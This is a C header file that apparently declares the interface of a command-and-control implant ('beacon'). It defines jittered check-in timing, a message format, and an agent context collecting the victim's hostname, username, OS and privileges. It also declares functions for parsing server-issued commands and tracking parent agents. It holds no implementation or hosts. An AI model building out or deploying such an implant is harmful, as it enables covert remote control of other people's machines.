#ifndef BEACON_H
#define BEACON_H

#include <stdint.h>
#include <stddef.h>
#include "crypto.h"

#define AGENT_ID_LEN      8
#ifndef BEACON_INTERVAL
#define BEACON_INTERVAL   30000   /* ms — override with -DBEACON_INTERVAL=N */
#endif
#ifndef JITTER_PCT
#define JITTER_PCT        40
#endif
#define OUTPUT_BUF_SIZE   (10 * 1024 * 1024)

#pragma pack(push, 1)
typedef struct {
    uint16_t magic;        /* 0xCC20 */
    uint32_t agent_id_u32;
    uint16_t payload_len;
} msg_header_t;
#pragma pack(pop)

#define MSG_MAGIC 0xCC20

typedef struct {
    char         agent_id[AGENT_ID_LEN + 1];
    char         hostname[256];
    char         username[128];
    char         os_info[128];
    char         privileges[32];
    crypto_ctx_t crypto;
    int          handshake_done;
    char        *pending_output;
    size_t       output_len;
    char         last_task_id[64];
    char         parent_id[AGENT_ID_LEN + 1];  /* agent that spawned us, or "" */
} agent_ctx_t;

int  agent_init(agent_ctx_t *ctx);
void agent_free(agent_ctx_t *ctx);

char *beacon_build(agent_ctx_t *ctx);
char *beacon_build_handshake(agent_ctx_t *ctx);

int  beacon_parse_response(agent_ctx_t *ctx, const char *raw_b64,
                           char *cmd_out, size_t cmd_sz,
                           char *args_out, size_t args_sz,
                           char *task_id_out, size_t task_id_sz,
                           char **data_out);

void beacon_append_output(agent_ctx_t *ctx, const char *data, size_t len);
void beacon_clear_output(agent_ctx_t *ctx);
void beacon_sleep(void);

void agent_gen_id(char *id_out);
void agent_get_hostname(char *buf, size_t len);
void agent_get_username(char *buf, size_t len);
void agent_get_os(char *buf, size_t len);
void agent_get_privileges(char *buf, size_t len);
void agent_write_parent_id(const char *id);

void agent_write_gs_flag(void);
int  agent_read_gs_flag(void);
int  agent_gs_flag_exists(void); /* 1 if flag file is present (not yet consumed) */

#endif /* BEACON_H */
